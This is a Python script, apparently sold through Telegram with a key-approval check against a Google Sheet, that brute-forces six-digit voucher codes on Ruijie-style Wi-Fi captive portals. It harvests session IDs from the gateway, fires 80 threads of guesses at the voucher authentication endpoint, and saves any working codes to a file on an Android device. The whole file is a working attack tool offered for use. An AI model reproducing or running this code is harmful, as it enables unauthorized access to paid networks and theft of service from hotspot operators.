import requests
import random
import string
import time
import os
import threading
import re
import sys
import urllib3
from queue import Queue, Empty
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==============================
# KEY APPROVAL SYSTEM CONFIG
# ==============================
SHEET_ID = "1MKfd87jf2GB9rE1QWTU0BCTno9l3my2ewdfpUEMM9hI"
SHEET_CSV_URL = f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/export?format=csv&gid=0"
LOCAL_KEYS_FILE = os.path.expanduser("~/.turbo_approved_keys.txt")

# Colors
bcyan = "\033[1;36m"
reset = "\033[00m"
white = "\033[0;37m"
bgreen = "\033[1;32m"
bred = "\033[1;31m"
yellow = "\033[0;33m"

# ==============================
# EXTREME SCANNER CONFIG
# ==============================
NUM_THREADS = 80             
SESSION_POOL_SIZE = 30       
PER_SESSION_MAX = 200        
SAVE_PATH = "/storage/emulated/0/zapya/valid_codes.txt"

# GLOBALS
session_pool = Queue()
valid_codes = [] 
valid_lock = threading.Lock()
file_lock = threading.Lock()
DETECTED_BASE_URL = None
TOTAL_TRIED = 0
TOTAL_HITS = 0
CURRENT_CODE = ""
START_TIME = time.time()
stop_event = threading.Event()

# ==============================
# KEY SYSTEM FUNCTIONS
# ==============================
def get_system_key():
    try: uid = os.geteuid()
    except: uid = 1000
    try: username = os.getlogin()
    except: username = os.environ.get('USER', 'unknown')
    return f"{uid}{username}"

def fetch_authorized_keys():
    keys = []
    try:
        response = requests.get(SHEET_CSV_URL, timeout=10)
        if response.status_code == 200:
            for line in response.text.strip().split('\n'):
                line = line.strip()
                if line and not any(x in line.lower() for x in ['username', 'key']):
                    key = line.split(',')[0].strip().strip('"')
                    if key: keys.append(key)
            if keys:
                with open(LOCAL_KEYS_FILE, 'w') as f: f.write('\n'.join(keys))
            return keys
    except: pass
    try:
        if os.path.exists(LOCAL_KEYS_FILE):
            with open(LOCAL_KEYS_FILE, 'r') as f:
                keys = [line.strip() for line in f if line.strip()]
    except: pass
    return keys

def check_approval():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{bcyan}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                    KEY APPROVAL SYSTEM                               ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
    system_key = get_system_key()
    authorized_keys = fetch_authorized_keys()
    
    if system_key in authorized_keys:
        print(f"\n{bgreen}[✓] KEY APPROVED! Launching Scanner...{reset}")
        time.sleep(1.5)
        return True
    else:
        print(f"\n{bred}❌ KEY NOT APPROVED ❌{reset}")
        print(f"{yellow}Your Key: {system_key}{reset}")
        print(f"\nContact to buy:")
        print(f"📱 Telegram: @Kenobe21")
        print(f"📢 Channel:  https://t.me/Skyblue021")
        return False

# ==============================
# SCANNER FUNCTIONS
# ==============================
def get_sid_from_gateway():
    global DETECTED_BASE_URL
    s = requests.Session()
    test_url = "http://connectivitycheck.gstatic.com/generate_204"
    try:
        r1 = s.get(test_url, allow_redirects=True, timeout=4)
        path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
        final_url = urljoin(r1.url, path_match.group(1)) if path_match else r1.url
        if path_match:
            r2 = s.get(final_url, timeout=4)
            final_url = r2.url
        parsed = urlparse(final_url)
        DETECTED_BASE_URL = f"{parsed.scheme}://{parsed.netloc}"
        sid = parse_qs(parsed.query).get('sessionId', [None])[0]
        return sid
    except: return None

def session_refiller():
    while not stop_event.is_set():
        try:
            if session_pool.qsize() < SESSION_POOL_SIZE:
                sid = get_sid_from_gateway()
                if sid:
                    session_pool.put({'sessionId': sid, 'left': PER_SESSION_MAX})
            time.sleep(0.5)
        except: time.sleep(2)

def worker_thread():
    global TOTAL_TRIED, TOTAL_HITS, CURRENT_CODE
    thr_session = requests.Session()
    headers = {'Content-Type': 'application/json', 'Connection': 'keep-alive'}
    while not stop_event.is_set():
        try:
            if not DETECTED_BASE_URL:
                time.sleep(1); continue
            try: slot = session_pool.get(timeout=2)
            except Empty: continue
            sid = slot.get('sessionId')
            code = ''.join(random.choices(string.digits, k=6))
            CURRENT_CODE = code
            r = thr_session.post(f"{DETECTED_BASE_URL}/api/auth/voucher/", 
                                 json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, 
                                 headers=headers, timeout=6)
            TOTAL_TRIED += 1
            res_text = r.text.lower()
            if "true" in res_text:
                with valid_lock:
                    if code not in valid_codes:
                        valid_codes.append(code)
                        TOTAL_HITS += 1
                        save_locally(code, sid)
            if not any(m in res_text for m in ["timeout", "expired", "invalid"]) and r.status_code not in (401, 403):
                slot['left'] -= 1
                if slot['left'] > 0: session_pool.put(slot)
        except: pass

def save_locally(code, sid):
    ts = datetime.now().strftime("%H:%M:%S")
    try:
        os.makedirs(os.path.dirname(SAVE_PATH), exist_ok=True)
        with file_lock:
            with open(SAVE_PATH, "a") as f: f.write(f"{ts} | {code} | SID: {sid}\n")
    except: pass

def live_dashboard():
    while not stop_event.is_set():
        os.system('clear' if os.name == 'posix' else 'cls')
        elapsed = time.time() - START_TIME
        speed = TOTAL_TRIED / elapsed if elapsed > 0 else 0
        print("="*50)
        print(f"   ⚡ RUIJIE EXTREME SPEED SCANNER ⚡   ")
        print(f"   {bgreen}STATUS: KEY APPROVED ✓{reset}")
        print("="*50)
        print(f" [BASE URL] : {DETECTED_BASE_URL}")
        print(f" [THREADS]  : {NUM_THREADS} active")
        print(f" [SESSIONS] : {session_pool.qsize()} in pool")
        print("-"*50)
        print(f" [TOTAL TRIED] : {TOTAL_TRIED:,}")
        print(f" [FOUND HITS]  : {TOTAL_HITS}")
        print(f" [LIVE SPEED]  : {speed:.1f} codes/sec")
        print(f" [LAST CODE]   : {CURRENT_CODE}")
        print("-"*50)
        print(" [SUCCESS CODES]:")
        for c in valid_codes[-5:]: print(f"  > ✅ {c}")
        print("-"*50)
        print(" (CTRL+C TO STOP)")
        time.sleep(0.8)

if __name__ == "__main__":
    if check_approval():
        try:
            threading.Thread(target=session_refiller, daemon=True).start()
            threading.Thread(target=live_dashboard, daemon=True).start()
            for _ in range(NUM_THREADS):
                threading.Thread(target=worker_thread, daemon=True).start()
            while True: time.sleep(1)
        except KeyboardInterrupt:
            stop_event.set()
            print("\n[!] Scanner stopped.")
    else:
        sys.exit(1)
